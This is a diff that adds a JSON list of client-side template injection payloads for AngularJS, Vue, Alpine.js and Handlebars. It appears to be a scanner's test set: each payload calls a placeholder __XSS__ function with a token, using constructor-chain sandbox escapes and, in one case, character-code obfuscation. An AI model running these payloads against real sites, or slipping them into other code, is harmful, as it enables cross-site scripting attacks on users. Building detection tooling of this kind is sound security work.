@@ -1,0 +1,18 @@
+[
+  "{{constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
+  "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=1} } };__XSS__(\"{{TOKEN}}\");//');}}",
+  "1|toString().constructor.prototype.toString=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,95,95,88,83,83,95,95,40,39,123,123,84,79,75,69,78,125,125,39,41)",
+  "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,__XSS__(\"{{TOKEN}}\"),a')}}",
+  "<div ng-app>{{constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
+  "<div ng-controller=\"a\">{{$eval.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
+  "{{_c.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
+  "<div id=\"app\">{{_c.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
+  "{{_ctx.constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
+  "<div x-data x-init=\"$el.ownerDocument.defaultView.__XSS__('{{TOKEN}}')\"></div>",
+  "<div x-data=\"{msg: '__XSS__(\\'{{TOKEN}}\\')'}\" x-html=\"msg\"></div>",
+  "{{#with \"constructor\"}}{{#with split}}{{pop (push \"__XSS__('{{TOKEN}}')\")}}{{/with}}{{/with}}",
+  "{{$on.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
+  "{{$root.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
+  "{{[].filter.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
+  "{{true.constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}"
+]
